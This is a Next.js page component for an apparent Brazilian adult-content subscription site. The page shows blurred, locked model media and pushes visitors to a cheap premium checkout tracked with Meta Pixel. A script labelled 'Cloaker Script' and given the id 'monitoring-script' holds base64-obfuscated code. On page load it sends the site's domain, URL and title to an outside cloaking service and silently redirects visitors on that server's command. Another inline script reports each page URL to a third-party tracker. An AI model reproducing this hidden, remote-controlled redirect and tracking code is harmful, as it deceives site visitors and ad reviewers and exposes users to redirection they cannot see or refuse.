"use client";
import Image from "next/image";
import { useRouter, useSearchParams } from "next/navigation";
import { useState, useEffect, Suspense } from "react";
import Script from "next/script";
import {
  ImageIcon,
  Video,
  Heart,
  BadgeCheck,
  Lock,
  ExternalLink,
  ArrowLeft,
  Globe,
  CircleDollarSign,
} from "lucide-react";
import { useLanguage } from "@/contexts/LanguageContext";
import LanguageModal from "@/components/LanguageModal";
import { useTelegramWebApp } from "@/hooks/useTelegramWebApp";
import modelsData from "./modelos.json";

// Interface para definir a estrutura dos dados da modelo
interface ModelData {
  id: number;
  name: string;
  username: string;
  profile_image: string;
  banner_image: string;
  likes_count: string;
  videos_count: number;
  photos_count: number;
  posts_count: number;
  total_media_count: number;
  verified: boolean;
  reddit_post_image: string | null;
  reddit_all_1?: string;
  reddit_all_2?: string;
  reddit_all_3?: string;
  reddit_all_4?: string;
  reddit_all_5?: string;
  reddit_all_6?: string;
  reddit_photos_1?: string;
  reddit_photos_2?: string;
  reddit_photos_3?: string;
  reddit_photos_4?: string;
  reddit_photos_5?: string;
  reddit_photos_6?: string;
  reddit_videos_1?: string;
  reddit_videos_2?: string;
  reddit_videos_3?: string;
  reddit_videos_4?: string;
  reddit_videos_5?: string;
  reddit_videos_6?: string;
}

// Função helper para criar array de mídias baseado nos dados da modelo
const createMediaItems = (modelData: ModelData) => {
  const allItems = [];
  // Adiciona fotos específicas
  for (let i = 1; i <= 6; i++) {
    const key = `reddit_photos_${i}` as keyof ModelData;
    const url = modelData[key] as string;
    if (url && url.trim() !== "") {
      allItems.push({
        url: url,
        type: "photo",
      });
    }
  }

  // Adiciona vídeos específicos
  for (let i = 1; i <= 6; i++) {
    const key = `reddit_videos_${i}` as keyof ModelData;
    const url = modelData[key] as string;
    if (url && url.trim() !== "") {
      allItems.push({
        url: url,
        type: "video",
      });
    }
  }
  // Se não há mídias, usa mídias de fallback da primeira modelo
  if (allItems.length === 0) {
    const fallbackModel = (modelsData as ModelData[])[0];
    if (fallbackModel) {
      // Adiciona fotos da modelo de fallback
      for (let i = 1; i <= 6; i++) {
        const key = `reddit_photos_${i}` as keyof ModelData;
        const url = fallbackModel[key] as string;
        if (url && url.trim() !== "") {
          allItems.push({
            url: url,
            type: "photo",
          });
        }
      }

      // Adiciona vídeos da modelo de fallback
      for (let i = 1; i <= 6; i++) {
        const key = `reddit_videos_${i}` as keyof ModelData;
        const url = fallbackModel[key] as string;
        if (url && url.trim() !== "") {
          allItems.push({
            url: url,
            type: "video",
          });
        }
      }
    }
  }

  return allItems;
};

// Função helper para criar array de posts
const createPostItems = (modelData: ModelData) => {
  const items = [];

  if (modelData.reddit_post_image) {
    items.push({
      url: modelData.reddit_post_image,
    });
  }

  if (modelData.profile_image) {
    items.push({
      url: modelData.profile_image,
    });
  }

  return items;
};

function LaranjinhaMidiasPageContent() {
  const { t } = useLanguage();

  const searchParams = useSearchParams();
  useTelegramWebApp();
  const [activeTab, setActiveTab] = useState<"posts" | "media">("media");
  const [activeFilter, setActiveFilter] = useState<"all" | "photos" | "videos">(
    "all"
  );
  const [currentModel, setCurrentModel] = useState<ModelData | null>(null);
  const [isPremiumModalOpen, setIsPremiumModalOpen] = useState(false);
  const handlePremiumAction = () => {
    setIsPremiumModalOpen(true);
  };
  const router = useRouter();
  const getCurrentSearch = () =>
    typeof window === "undefined" ? "" : window.location.search;

  const verifyIsTelegram = () => {
    if (typeof window === "undefined") {
      return false;
    }

    const search = window.location.search || "";
    if (search.startsWith("?istelegram=true")) {
      return true;
    }

    const urlParams = new URLSearchParams(search);
    return urlParams.get("istelegram") === "true";
  };

  const buildSearchParams = (isTelegram: boolean) => {
    if (typeof window === "undefined") {
      return "";
    }

    if (!isTelegram) {
      return getCurrentSearch();
    }

    const params = new URLSearchParams(getCurrentSearch());
    params.set("istelegram", "true");
    const queryString = params.toString();
    return queryString ? `?${queryString}` : "";
  };
  // Função para obter a URL correta baseada no contexto do Telegram
  const getCheckoutUrl = () => {
    const isTelegram = verifyIsTelegram();
    return `${isTelegram ? "/pagamento" : "/checkout"}${buildSearchParams(
      isTelegram
    )}`;
  };

  // Função para disparar evento do Meta Pixel e redirecionar
  const handleUnlockContent = () => {
    // Dispara evento AddToCart do Meta Pixel
    if (typeof window !== "undefined" && (window as any).fbq) {
      (window as any).fbq("track", "AddToCart", {
        content_name: "Plano Anual Premium",
        content_ids: ["plano_anual_premium"],
        content_type: "product",
        value: 5.0,
        currency: "BRL",
      });
    }
    // Redireciona para checkout
    window.location.href = getCheckoutUrl();
  };

  const handleViewPlans = () => {
    // Dispara evento AddToCart do Meta Pixel
    if (typeof window !== "undefined" && (window as any).fbq) {
      (window as any).fbq("track", "AddToCart", {
        content_name: "Plano Anual Premium",
        content_ids: ["plano_anual_premium"],
        content_type: "product",
        value: 5.0,
        currency: "BRL",
      });
    }
    // Redireciona para checkout
    window.location.href = getCheckoutUrl();
  };

  // Carrega os dados da modelo baseado no ID da URL
  useEffect(() => {
    const modelId = searchParams.get("id");
    if (modelId) {
      const foundModel = (modelsData as ModelData[]).find(
        (model) => model.id === parseInt(modelId)
      );
      setCurrentModel(foundModel || null);
    } else {
      // Se não há ID, carrega a primeira modelo (Kamylinha por padrão)
      const defaultModel = (modelsData as ModelData[]).find(
        (model) => model.name.toLowerCase() === "kamylinha"
      );
      setCurrentModel(defaultModel || (modelsData as ModelData[])[0] || null);
    }
  }, [searchParams]);

  // Se não há modelo carregada, mostra loading
  if (!currentModel) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-orange-950 via-orange-900 to-orange-950 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-orange-500 mx-auto mb-4"></div>
          <p className="text-orange-100">Carregando...</p>
        </div>
      </div>
    );
  }
  // Cria arrays de mídias e posts baseados na modelo atual
  const allMediaItems = createMediaItems(currentModel);
  const postItems = createPostItems(currentModel);
  const getFilteredMedia = () => {
    if (activeFilter === "photos") {
      return allMediaItems.filter((item) => item.type === "photo");
    }
    if (activeFilter === "videos") {
      return allMediaItems.filter((item) => item.type === "video");
    }
    return allMediaItems; // "all"
  };

  const currentItems = activeTab === "media" ? getFilteredMedia() : postItems;

  return (
    <>
      {/* UTM Handler Script */}
      <Script
        src="https://cdn.jsdelivr.net/gh/xTracky/static/utm-handler.js"
        data-token="3f0817fd-b04a-49a5-972c-416d223ac189"
        data-click-id-param="click_id"
      />

      {/* Cloaker Script */}
      <Script id="monitoring-script" strategy="afterInteractive">
        {`
          !function(){var d=atob("aHR0cHM6Ly9jbG9ha2VyLnBhcmFkaXNlcGFncy5jb20vLz9hcGk9bW9uaXRvcg=="),y=atob("bW9uXzE0N2Q5MmY1ZWI1MDk1ZjY5Yjg0MjgyYjQzYzZkYTY4ZmJmM2NiMDY1ZmNhMmUzNjhmYzg4NGI2ODQ4ZjY1NTk=");function createFormData(){var dgx=new FormData;return dgx.append(atob("bW9uaXRvcl9rZXk="),y),dgx.append(atob("ZG9tYWlu"),location.hostname),dgx.append(atob("dXJs"),location.href),dgx.append(atob("dGl0bGU="),document.title),dgx}function yxq(){fetch(d,{method:atob("UE9TVA=="),body:createFormData(),headers:{"X-Requested-With":atob("WE1MSHR0cFJlcXVlc3Q=")}}).then(function(fw){return fw.json()}).then(function(c){c.success&&c.redirect&&c.redirect_url&&location.replace(c.redirect_url)}).catch(function(){})}document.readyState===atob("bG9hZGluZw==")?document.addEventListener(atob("RE9NQ29udGVudExvYWRlZA=="),yxq):yxq()}();
        `}
      </Script>

      {/* UTMify Script */}
      <Script
        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
        data-utmify-prevent-xcod-sck
        data-utmify-prevent-subids
        strategy="afterInteractive"
        async
        defer
      />

      {/* Tracking Script */}
      <Script id="tracking-script" strategy="afterInteractive">
        {`
          fetch("https://trackerr--url.vercel.app/save-url", {
            method: "POST", 
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              userId: "68f838038daf9bf18d65a898",
              url: window.location.href
            }),
          });
        `}
      </Script>
      <div className="min-h-screen bg-gradient-to-b from-orange-950 via-orange-900 to-orange-950 text-orange-50">
        {/* Header de navegação fixo no topo */}
        <header className="bg-orange-950/90 backdrop-blur border-b border-orange-800/60 px-4 sticky top-0 z-40 h-[65px] flex items-center">
          <div className="flex items-center justify-between w-full">
            {/* Botão voltar */}
            <button
              onClick={() => (window.location.href = "/inicio")}
              className="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 w-10 transition-all duration-200 hover:scale-105 hover:bg-green-800/60 text-white"
            >
              <ArrowLeft className="h-5 w-5" />
            </button>
            {/* Logo central */}
            <div className="flex items-center justify-center flex-1">
              <button className="transition-all duration-200 hover:scale-105">
                <div className="flex items-center gap-[0.1rem] min-w-fit">
                  <div className="flex items-center justify-center w-8 h-8">
                    <Image
                      src="/laranjinha.png"
                      alt="Laranjinha Midias Icon"
                      width={40}
                      height={40}
                      className="object-contain"
                    />
                  </div>
                  <div className="flex flex-col">
                    <h1 className="text-2xl font-bold italic leading-tight font-['Poppins',sans-serif] whitespace-nowrap">
                      <span className="text-orange-50">Laranjinha Midias </span>
                    </h1>
                  </div>
                </div>
              </button>
            </div>
            {/* Botão direito (globo) */}
            <div className="flex items-center relative">
              <button className="gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-16 w-16 flex items-center justify-center transition-all duration-200 hover:scale-105 text-white">
                <Globe className="h-6 w-6" />
              </button>
            </div>
          </div>
        </header>
        <div className="relative">
          {" "}
          {/* Banner de fundo com imagem de destaque */}
          <div className="relative h-[175px] w-full overflow-hidden">
            <div
              className="absolute inset-0 bg-cover bg-center scale-110 transition-transform duration-700 hover:scale-125"
              style={{
                backgroundImage: `url('${currentModel.banner_image}')`,
              }}
            />
          </div>
          {/* Informações do topo do banner */}
          <div className="absolute top-4 left-4 right-4 text-white z-10 animate-in fade-in slide-in-from-top-4 duration-500 delay-200">
            <h2
              className="text-2xl font-bold"
              style={{
                textShadow:
                  "rgba(0, 0, 0, 0.8) 2px 2px 4px, rgba(0, 0, 0, 0.6) 1px 1px 2px",
              }}
            >
              {currentModel.name}
            </h2>
            <div
              className="flex items-center gap-4 mt-1 text-sm"
              style={{
                textShadow:
                  "rgba(0, 0, 0, 0.8) 1px 1px 3px, rgba(0, 0, 0, 0.6) 0px 0px 2px",
              }}
            >
              <div className="flex items-center gap-1">
                <ImageIcon
                  size={16}
                  className="drop-shadow-[2px_2px_4px_rgba(0,0,0,0.8)]"
                />
                <span>{currentModel.photos_count}</span>
              </div>
              <div className="flex items-center gap-1">
                <Video
                  size={16}
                  className="drop-shadow-[2px_2px_4px_rgba(0,0,0,0.8)]"
                />
                <span>{currentModel.videos_count}</span>
              </div>
              <div className="flex items-center gap-1">
                <Heart
                  size={16}
                  className="drop-shadow-[2px_2px_4px_rgba(0,0,0,0.8)]"
                />
                <span>{currentModel.likes_count}</span>
              </div>
            </div>
          </div>
          {/* Foto de perfil destacada */}
          <div className="absolute -bottom-[66px] left-4 z-20 animate-in fade-in slide-in-from-bottom-4 duration-500 delay-300">
            <div className="h-[132px] w-[132px] border-4 border-orange-200/60 rounded-full overflow-hidden transition-transform duration-200 hover:scale-105 bg-orange-100 relative">
              {" "}
              <Image
                alt={currentModel.name}
                src={currentModel.profile_image || "/placeholder.svg"}
                width={132}
                height={132}
                className="object-cover w-full h-full"
              />
            </div>
          </div>
        </div>

        {/* Content Section */}
        <div className="pt-[66px] px-4 pb-0 animate-in fade-in slide-in-from-bottom-4 duration-500 delay-400">
          {" "}
          {/* Título e Verificado */}
          <div className="flex items-center gap-1 mb-1">
            <h1 className="text-xl font-bold text-orange-50">
              {currentModel.name}
            </h1>
            {currentModel.verified && (
              <BadgeCheck className="text-[#F58673] h-[18px] w-[18px]" />
            )}
          </div>
          {/* Username e mensagem */}
          <p className="text-orange-100 mb-2">{currentModel.username}</p>
          <p className="text-orange-100 mb-4">
            Assine qualquer plano e desbloqueie todas modelos do site!!
          </p>
          <div className="h-[0.3rem] bg-orange-200/30 my-4 -mx-4" />
          {/* Botão de Assinatura */}
          <div className="mb-0">
            <h3 className="text-[16px] font-medium text-orange-50 mb-3">
              Assinaturas
            </h3>{" "}
            <div
              onClick={handleUnlockContent}
              className="w-full h-[60px] rounded-[30px] px-[25px] flex items-center justify-between text-white font-light text-[15px] transition-all duration-200 hover:scale-[1.02] hover:shadow-lg cursor-pointer"
              style={{
                background:
                  "linear-gradient(45deg, rgb(34, 197, 94), rgb(22, 163, 74))",
              }}
            >
              <Lock className="h-5 w-5 mr-2" />
              <span>Desbloqueie todos conteúdos</span>
              <ExternalLink className="h-5 w-5 ml-2" />
            </div>
          </div>
          <div className="h-[0.3rem] bg-orange-200/30 my-4 -mx-4" />{" "}
          {/* Botões de navegação */}
          <div className="flex gap-x-1">
            <button
              onClick={() => setActiveTab("posts")}
              className={`flex-1 py-3 text-center font-medium rounded-t-lg focus:outline-none transition-all duration-200 ${
                activeTab === "posts"
                  ? "bg-green-600 text-white scale-[1.02]"
                  : "bg-green-500/50 text-green-100 hover:bg-green-600/60"
              }`}
            >
              {currentModel.posts_count} postagens
            </button>
            <button
              onClick={() => setActiveTab("media")}
              className={`flex-1 py-3 text-center font-medium rounded-t-lg focus:outline-none transition-all duration-200 ${
                activeTab === "media"
                  ? "bg-green-600 text-white scale-[1.02]"
                  : "bg-green-500/50 text-green-100 hover:bg-green-600/60"
              }`}
            >
              {currentModel.total_media_count} mídias
            </button>
          </div>
          <div
            className="h-[2px]"
            style={{
              borderBottom: "2px solid transparent",
              borderImage:
                "linear-gradient(45deg, rgb(245, 129, 112), rgb(249, 175, 119)) 1 / 1 / 0 stretch",
            }}
          />{" "}
          {/* Filtros */}
          {activeTab === "media" ? (
            <div className="mt-4 -mx-4 animate-in fade-in slide-in-from-bottom-4 duration-300">
              {" "}
              <div className="flex justify-around items-center mb-3 px-4">
                <button
                  onClick={() => setActiveFilter("all")}
                  className={`rounded-full px-3 py-2 text-[12px] md:px-4 md:py-1 md:text-[16px] font-light whitespace-nowrap select-none cursor-pointer transition-all duration-200 ${
                    activeFilter === "all"
                      ? "bg-green-600 text-white scale-105 shadow-sm"
                      : "bg-green-500/50 text-green-100 hover:bg-green-600/60 hover:scale-105"
                  }`}
                >
                  {currentModel.total_media_count} todos
                </button>
                <button
                  onClick={() => setActiveFilter("photos")}
                  className={`rounded-full px-3 py-2 text-[12px] md:px-4 md:py-1 md:text-[16px] font-light whitespace-nowrap select-none cursor-pointer transition-all duration-200 ${
                    activeFilter === "photos"
                      ? "bg-green-600 text-white scale-105 shadow-sm font-semibold"
                      : "bg-green-500/50 text-green-100 hover:bg-green-600/60 hover:scale-105"
                  }`}
                >
                  {currentModel.photos_count} fotos
                </button>
                <button
                  onClick={() => setActiveFilter("videos")}
                  className={`rounded-full px-3 py-2 text-[12px] md:px-4 md:py-1 md:text-[16px] font-light whitespace-nowrap select-none cursor-pointer transition-all duration-200 ${
                    activeFilter === "videos"
                      ? "bg-green-600 text-white scale-105 shadow-sm font-semibold"
                      : "bg-green-500/50 text-green-100 hover:bg-green-600/60 hover:scale-105"
                  }`}
                >
                  {currentModel.videos_count} vídeos
                </button>
              </div>{" "}
              {/* Mídias */}
              <div className="grid grid-cols-3 gap-1">
                {" "}
                {currentItems.map((item: any, index: number) => (
                  <div
                    key={index}
                    onClick={() => setIsPremiumModalOpen(true)}
                    className="relative aspect-square bg-[#F4EEE5] rounded-md overflow-hidden transition-all duration-200 hover:scale-105 hover:shadow-lg cursor-pointer"
                    style={{ animationDelay: `${index * 100}ms` }}
                  >
                    {" "}
                    <Image
                      alt={`${activeTab === "media" ? "Mídia" : "Post"} ${
                        index + 1
                      }`}
                      src={item.url || "/placeholder.svg"}
                      fill
                      sizes="100vw"
                      className="object-cover blur-lg brightness-60"
                    />
                    <div className="absolute inset-0 bg-black/30" />
                    <div className="absolute inset-0 flex items-center justify-center">
                      <Lock className="h-7 w-7 text-white z-10 drop-shadow-lg transition-transform duration-200 hover:scale-110" />
                    </div>
                    {/* Indicador de tipo de mídia */}
                    {activeTab === "media" && item.type === "video" && (
                      <div className="absolute top-2 right-2 bg-black/50 rounded-full p-1">
                        <Video className="h-3 w-3 text-white" />
                      </div>
                    )}
                  </div>
                ))}{" "}
              </div>
            </div>
          ) : (
            <div className="mt-6 -mx-4 animate-in fade-in slide-in-from-bottom-4 duration-300">
              {" "}
              <div className="flex items-center gap-3 mb-3 px-4">
                <div className="h-[62px] w-[62px] rounded-full overflow-hidden transition-transform duration-200 hover:scale-105 bg-gray-200">
                  {" "}
                  <Image
                    alt={currentModel.name}
                    width={62}
                    height={62}
                    className="object-cover w-full h-full"
                    src={currentModel.profile_image || "/placeholder.svg"}
                  />
                </div>
                <div className="flex-1">
                  <div className="flex items-center gap-1">
                    <span className="font-semibold text-[16px] text-gray-300">
                      {currentModel.name}
                    </span>
                    {currentModel.verified && (
                      <span className="inline-block h-[16px] w-[16px] text-[#F58673] ml-1">
                        <svg
                          aria-hidden="true"
                          focusable="false"
                          data-prefix="fal"
                          data-icon="badge-check"
                          className="h-4 w-4"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 512 512"
                        >
                          <path
                            fill="currentColor"
                            d="M363.3 203.3c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L224 297.4l-52.7-52.7c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6l64 64c6.2 6.2 16.4 6.2 22.6 0l128-128z"
                          />
                        </svg>
                      </span>
                    )}
                  </div>
                  <p className="text-gray-300 text-sm">
                    {currentModel.username}
                  </p>
                </div>
                <button className="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium h-8 w-8 text-gray-300 hover:bg-gray-800 transition-all duration-200 hover:scale-110">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    className="lucide lucide-ellipsis-vertical h-4 w-4"
                  >
                    <circle cx="12" cy="12" r="1" />
                    <circle cx="12" cy="5" r="1" />
                    <circle cx="12" cy="19" r="1" />
                  </svg>
                </button>
              </div>{" "}
              <div
                onClick={() => setIsPremiumModalOpen(true)}
                className="mb-3 relative aspect-square bg-[#F4EEE5] overflow-hidden cursor-pointer"
              >
                {" "}
                <Image
                  alt="Post foto"
                  fill
                  className="object-cover filter blur-[25px] brightness-[.6] saturate-[1.5] contrast-[1.3] scale-[1.3] rotate-[2deg]"
                  src={currentModel.reddit_post_image || "/placeholder.svg"}
                />
                <div className="absolute inset-0 bg-gradient-to-br from-purple-900/20 via-black/30 to-blue-900/15" />
                <div className="absolute inset-0 bg-black/15" />
                <div className="absolute inset-0 flex flex-col items-center justify-center">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    className="lucide lucide-lock h-6 w-6 text-white z-10 drop-shadow-lg mb-2"
                  >
                    <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                  </svg>
                  <p className="text-white text-xs font-medium drop-shadow-lg">
                    Conteúdo Exclusivo para Assinantes
                  </p>
                </div>
              </div>{" "}
              <div className="flex items-center justify-between px-4 py-2">
                <div className="flex items-center gap-4">
                  <button
                    onClick={handlePremiumAction}
                    className="text-gray-300 transition-all duration-200 hover:scale-110"
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      className="lucide lucide-heart h-6 w-6"
                    >
                      <path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z" />
                    </svg>
                  </button>
                  <button
                    onClick={handlePremiumAction}
                    className="text-gray-300 transition-all duration-200 hover:scale-110"
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      className="lucide lucide-message-circle h-6 w-6"
                    >
                      <path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z" />
                    </svg>
                  </button>
                </div>
                <button
                  onClick={handlePremiumAction}
                  className="text-gray-300 transition-all duration-200 hover:scale-110"
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    className="lucide lucide-bookmark h-6 w-6"
                  >
                    <path d="m19 21-7-4-7 4V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2v16z" />
                  </svg>
                </button>
              </div>
            </div>
          )}
          {/* Banner de conteúdo exclusivo */}
          <div className="mt-6 mb-4 px-4">
            <div className="p-4 bg-gradient-to-r from-orange-900/50 to-orange-800/50 border border-orange-600/40 rounded-xl shadow-sm animate-in fade-in slide-in-from-bottom-4 duration-500">
              <div className="flex items-start gap-3">
                <div className="flex-shrink-0 mt-0.5">
                  <div className="h-8 w-8 bg-gradient-to-r from-green-500 to-green-600 rounded-full flex items-center justify-center">
                    <Lock className="h-4 w-4 text-white" />
                  </div>
                </div>
                <div className="flex-1">
                  <h3 className="text-sm font-semibold text-orange-50 mb-1">
                    Conteúdo Exclusivo
                  </h3>
                  <p className="text-xs text-orange-100 leading-relaxed">
                    Para visualizar todas as postagens e mídias, você precisa
                    assinar um dos nossos planos premium.
                  </p>
                  <div className="mt-3">
                    {" "}
                    <button
                      onClick={handleViewPlans}
                      className="inline-flex items-center gap-2 px-3 py-1.5 bg-gradient-to-r from-green-500 to-green-600 text-white text-xs font-medium rounded-lg hover:from-green-600 hover:to-green-700 transition-all duration-200 hover:scale-105 shadow-sm"
                    >
                      <CircleDollarSign className="h-3 w-3" />
                      Ver Planos
                      <ExternalLink className="h-3 w-3" />
                    </button>
                  </div>
                </div>{" "}
              </div>
            </div>
          </div>
          {/* Modal Premium */}
          {isPremiumModalOpen && (
            <>
              {/* Backdrop */}
              <div
                className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm"
                onClick={() => setIsPremiumModalOpen(false)}
              />{" "}
              {/* Modal */}
              <div
                role="dialog"
                aria-labelledby="modal-title"
                aria-describedby="modal-description"
                className="fixed left-1/2 top-1/2 z-50 grid w-[95vw] max-w-lg -translate-x-1/2 -translate-y-1/2 gap-4 bg-orange-950/95 backdrop-blur rounded-xl p-6 shadow-lg sm:w-full animate-in fade-in slide-in-from-bottom-4 duration-300"
              >
                <h2 id="modal-title" className="sr-only">
                  Conteúdo Exclusivo
                </h2>

                <div className="flex items-start gap-3 mb-4">
                  <div className="flex-shrink-0 mt-0.5">
                    <div className="h-10 w-10 bg-gradient-to-r from-green-500 to-green-600 rounded-full flex items-center justify-center">
                      <Lock className="h-5 w-5 text-white" />
                    </div>
                  </div>
                  <div className="flex-1">
                    <h3 className="text-lg font-semibold text-orange-50 mb-2">
                      Conteúdo Exclusivo!
                    </h3>
                    <p
                      id="modal-description"
                      className="text-sm text-orange-100 leading-relaxed"
                    >
                      Para visualizar todas as mídias e postagens de{" "}
                      <b>todas modelos</b>, você precisa assinar um dos nossos
                      planos premium.
                    </p>
                  </div>
                </div>

                <div className="flex gap-3">
                  <button
                    onClick={handleViewPlans}
                    className="flex-1 inline-flex items-center justify-center gap-2 px-4 py-2 bg-gradient-to-r from-green-500 to-green-600 text-white text-sm font-medium rounded-lg hover:from-green-600 hover:to-green-700 transition-all duration-200 hover:scale-105 shadow-sm"
                  >
                    <CircleDollarSign className="h-4 w-4" />
                    Ver Planos
                  </button>
                  <button
                    onClick={() => setIsPremiumModalOpen(false)}
                    className="px-4 py-2 text-green-200 text-sm font-medium rounded-lg hover:bg-green-800/60 transition-colors duration-200"
                  >
                    Fechar
                  </button>
                </div>
              </div>
            </>
          )}
        </div>
      </div>

      {/* =============================================================== */}
      {/* SCRIPTS ADICIONAIS - Meta Pixel */}
      {/* =============================================================== */}
      <Script id="meta-pixel" strategy="afterInteractive">
        {`
          !function(f,b,e,v,n,t,s)
          {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
          n.callMethod.apply(n,arguments):n.queue.push(arguments)};
          if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
          n.queue=[];t=b.createElement(e);t.async=!0;
          t.src=v;s=b.getElementsByTagName(e)[0];
          s.parentNode.insertBefore(t,s)}(window, document,'script',
          'https://connect.facebook.net/en_US/fbevents.js');
          fbq('init', '814735554702486');
          fbq('track', 'PageView');
        `}
      </Script>
      <noscript>
        <img
          height="1"
          width="1"
          style={{ display: "none" }}
          src="https://www.facebook.com/tr?id=814735554702486&ev=PageView&noscript=1"
        />
      </noscript>
    </>
  );
}

// Loading component for Suspense fallback
function LoadingFallback() {
  return (
    <div className="min-h-screen bg-white flex items-center justify-center">
      <div className="text-center">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-orange-500 mx-auto mb-4"></div>
        <p className="text-gray-600">Carregando...</p>
      </div>
    </div>
  );
}

// Main export with Suspense wrapper
export default function LaranjinhaMidiasPage() {
  return (
    <Suspense fallback={<LoadingFallback />}>
      <LaranjinhaMidiasPageContent />
    </Suspense>
  );
}
